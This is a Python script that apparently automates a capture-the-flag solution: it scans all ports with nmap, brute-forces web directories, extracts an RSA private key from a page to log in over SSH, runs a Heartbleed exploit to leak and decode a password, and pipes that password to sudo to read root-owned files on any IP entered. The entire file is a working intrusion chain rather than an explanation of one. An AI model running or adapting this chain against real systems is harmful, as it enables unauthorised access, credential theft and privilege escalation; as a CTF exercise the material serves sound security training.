import nmap # To scan for open ports for a given ip address
import requests # To send HTTP requests for flag1 and flag2
import re # To search for the flag in the html source code
import dirbuster_ctf # To perform directory brute force attack for flag 2
import subprocess # To run bash commands
import base64 # To decode ns password

# Gets the open ports for a given IP address
def get_open_ports(ip: str):
	print(f'\nSearching for open ports on {ip} ...')

	nm = nmap.PortScanner()
	nm.scan(ip, arguments='-p-')
	open_ports = []

	for host in nm.all_hosts():
		print(f'Found the following open ports on {host}:')
		for port in nm[host]['tcp'].keys():
			if nm[host]['tcp'][port]['state'] == 'open':
				print('port : %s\t name : %s' % (port, nm[host]['tcp'][port]['name']))
				open_ports.append(port)
		print()

	return open_ports

# Search for the flag in the html sorce code. The flag is of the form flagN{...}
def get_flag_from_HTML(html: str, flag_no: int = 1):
	print(f'\nSearching for flag {flag_no} in the HTML source code ...')
	flag = re.search('flag'+str(flag_no)+'\{[^\}]+\}', html)
	if flag:
		return flag.group()
	else:
		return 'Not found'

# Retrieve the RSA private key from the HTML source code
def get_rsa_pvt_key_from_HTML(html: str):
	print('\nSearching for RSA private key in the HTML source code ...')
	rsa_key = re.search(r'-----BEGIN RSA PRIVATE KEY-----(.|\n)*?-----END RSA PRIVATE KEY-----', html).group()
	
	# Save the RSA private key to a file
	print(f'Saving RSA private key to ssh_key_({hostname}).pem')
	with open(f'ssh_key_({hostname}).pem', 'w') as f:
		f.write(rsa_key)
	subprocess.call(['chmod', '600', f'ssh_key_({hostname}).pem']) # Adjust permissions for the file
	print('RSA private key saved successfully\n')

# Perform heartbleed attack to obtain the password from the leaked memory
def get_password():
	vulnerable_port = str(ports[2])

	print('Performing heartbleed attack to obtain password...')
	output = subprocess.check_output(["python2.7", "./heartbleed.py", hostname, "-p", vulnerable_port, "-n", '20', "-v" ])
	output_str = output.decode("utf-8")
	pattern = r'password=([^\s&]*)'
	match = re.search(pattern, output_str)
	
	raw_password = match[1]
	print('Heartbleed attack successful')
	print(f'Raw password found: {raw_password}')

	print('\nDecoding password using Base64 decoding (2 passes)')
	first_pass = base64decode(raw_password)
	password = base64decode(first_pass)
	print(f'Password for ns decoded.\nPassword: {password}\n')
	return password

# Decode a string using base64 decoding
def base64decode(string: str):
	string += "=" * ((4 - len(string) % 4) % 4) # Add padding
	decoded_str = base64.b64decode(string).decode() # Use the base64 module to decode the string
	return decoded_str

# Pretty printing for headings
def print_heading(heading: str, count:int = 6):
	print(f'\n{"="*count} {heading} {"="*count}')

# Get flag 1 by scanning for open ports and then sending a request to the port and parsing for flag1
ports = []
def get_flag_1():
	print_heading('FLAG 1')
	print('Performing attack for flag 1 by scanning for open ports and searching for flag1 through them...')

	# Scan for open ports on the target machine
	global ports
	ports = get_open_ports(hostname)
	# ports = ['22', '4451', '4461']

	flag1_port = str(ports[1])
	flag1_url = 'http://' + hostname + ':' + flag1_port
	print(f'Getting flag 1 from {flag1_url} ...')

	flag1_page = requests.get(flag1_url)

	if flag1_page.status_code == 200:  # If the request is successful
		html_source_code = flag1_page.text  # Retrieve the HTML source code
		# print(html_source_code)  # Print the HTML source code
		flag1 = get_flag_from_HTML(html_source_code, 1)  # Search for the flag in the HTML source code
		if flag1:
			print('Found flag 1')
			print(f'\n\tFlag 1: {flag1}\n')
	else:
		flag1 = 'Not found'
		print(f"Error: {flag1_page.status_code} {flag1_page.reason}")  # Print the error message

	return flag1

# Get flag 2 by performing a directory brute force attack and then parsing for flag2
flag2_page = None
def get_flag_2():
	print_heading('FLAG 2')
	print('Performing attack for flag 2 by bruteforcing various directories using dirbuster ...')

	flag2_port = str(ports[1])
	
	# Target file is located at url/{dir}/index.html
	flag2_buster = dirbuster_ctf.Pybuster(
		url='http://' + hostname + ':' + flag2_port, 
		wordfile='/opt/dirbuster/directory-list-lowercase-2.3-small.txt',
		threads=100,
		logfile='dirbuster.log', 
		codes=['200'],
		filename='index.html',
		text_to_search='flag2',
	)

	print('\nStarting the bruteforce attack ...')
	flag2_buster.Run()

	# Get the flag 2 from the page
	flag2_url = flag2_buster.get_url();
	global flag2_page
	flag2_page = requests.get(flag2_url)

	if flag2_page.status_code == 200:  # If the request is successful
		flag2 = get_flag_from_HTML(flag2_page.text, 2)  # Search for the flag in the HTML source code
		print(f'\n\tFlag 2: {flag2}\n')
	else:
		flag2 = 'Not found'
		print(f"Error: {flag2_page.status_code} {flag2_page.reason}")  # Print the error message

	return flag2

# Get flag 3 by retrieving the RSA private key from the flag 2 page and then using it to ssh into the system
def get_flag_3():
	print_heading('FLAG 3')
	print('Retrieve RSA private key from flag-2 page to ssh into the system and get flag-3 ...')

	# Get the RSA private key from the flag 2 page
	get_rsa_pvt_key_from_HTML(flag2_page.text)

	# SSH into the system with the RSA private key
	print('SSHing into the system with the RSA private key and retrieving ~/flag3.txt...')
	command = f'ssh -i ssh_key_\({hostname}\).pem -p {ports[0]} ns@{hostname} "cat ~/flag3.txt"'

	# Execute the command and capture the output
	output = subprocess.check_output(command, shell=True)
	flag3 = output.decode('utf-8').strip()
	if flag3:
		print(f"\n\tFlag 3: {flag3}\n")
	else:
		print("Flag 3 not found\n")

	return flag3

# Get flag 4 by using the heartbleed attack to get the password for ns and then using it to get sudo access to read flag4.txt
def get_flag_4():
	print_heading('FLAG 4')
	print('Performing attack for flag 4 by finding the password for ns using heartbleed attack. \n')

	# Get the password for ns
	password = get_password()

	# SSH into the system with the password
	print('SSHing into the system and reading /flag4.txt with the password found above...')
	command = f'ssh -i ssh_key_\({hostname}\).pem -p {ports[0]} ns@{hostname} "echo {password} | sudo -S cat /flag4.txt 2> /dev/null"'

	# Execute the command and capture the output
	output = subprocess.check_output(command, shell=True)
	flag4 = output.decode('utf-8').strip()
	if flag4:
		print(f"\n\tFlag 4: {flag4}\n")
	else:
		print("Flag 4 not found\n")

	return flag4

	
if __name__ == '__main__':
	# Get the IP address of the vulnerable machine with the flags
	hostname = input('Enter IP address: ') 
	# hostname = '10.200.15.248'

	print(f'\nBeginning attack on {hostname} ...')
	flag1 = get_flag_1()
	flag2 = get_flag_2()
	flag3 = get_flag_3()
	flag4 = get_flag_4()

	print_heading('ATTACK COMPLETE')
	print('All flags successfully found:')
	print(f'\tFlag 1: {flag1}')
	print(f'\tFlag 2: {flag2}')
	print(f'\tFlag 3: {flag3}')
	print(f'\tFlag 4: {flag4}')